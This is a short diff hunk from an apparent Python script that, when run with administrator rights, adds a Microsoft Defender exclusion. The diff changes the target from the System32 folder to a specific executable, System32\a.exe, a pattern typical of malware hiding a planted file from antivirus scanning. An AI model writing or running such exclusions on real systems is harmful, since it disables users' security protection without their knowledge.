@@ -21,7 +21,7 @@ def add_defender_exclusion_for_file(file_path):
         pass
 
 if __name__ == '__main__':
-    file_to_exclude = r"C:\Windows\System32"
+    file_to_exclude = r"C:\Windows\System32\a.exe"
 
     if is_admin():
         add_defender_exclusion_for_file(file_to_exclude)
